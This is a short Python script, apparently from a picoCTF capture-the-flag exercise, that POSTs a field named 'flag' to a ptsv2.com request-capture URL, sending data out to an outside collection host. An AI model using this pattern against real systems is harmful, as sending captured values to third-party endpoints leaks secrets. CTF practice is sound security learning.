from urllib.request import Request, urlopen
from urllib.parse import urlencode

url = "https://ptsv2.com/t/4ax09-1629609752/post"
post_fields = {"flag":"picoCTF{AS}"}

request = Request(url, urlencode(post_fields).encode())
json = urlopen(request)
